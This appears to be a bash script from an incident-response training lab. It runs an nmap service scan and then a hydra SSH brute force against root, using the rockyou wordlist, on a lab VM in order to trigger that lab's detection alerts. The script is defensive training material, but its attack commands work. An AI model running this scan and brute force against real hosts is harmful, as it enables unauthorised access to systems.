#!/bin/bash
# =============================================================
# IR Lab - Attack Simulation Script
# Run from VM2 (Kali Linux)
# Usage: bash scripts/simulation/attack_simulation.sh <TARGET_IP>
# WARNING: Only use in your own lab environment!
# =============================================================

TARGET_IP="${1:-192.168.126.10}"

echo "============================================================"
echo "  IR LAB - ATTACK SIMULATION"
echo "  FOR EDUCATIONAL PURPOSES ONLY"
echo "  Target: $TARGET_IP"
echo "============================================================"

echo ""
echo "[Phase 1] Reconnaissance - Port Scan"
echo "Scanning $TARGET_IP..."
nmap -sV -T4 --top-ports 100 "$TARGET_IP"

echo ""
read -p "Press Enter to continue to Phase 2 (SSH Brute Force)..."

echo ""
echo "[Phase 2] SSH Brute Force"
echo "This will trigger SSH_BRUTEFORCE detection on VM1..."
echo ""

if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
fi

hydra -l root -P /usr/share/wordlists/rockyou.txt "$TARGET_IP" ssh -t 4 -V

echo ""
echo "============================================================"
echo "  Simulation complete!"
echo "  Check VM1 for:"
echo "    journalctl -u ir-detection -f"
echo "    cat /opt/ir-lab/logs/alerts.json"
echo "    ls /opt/ir-lab/reports/"
echo "============================================================"
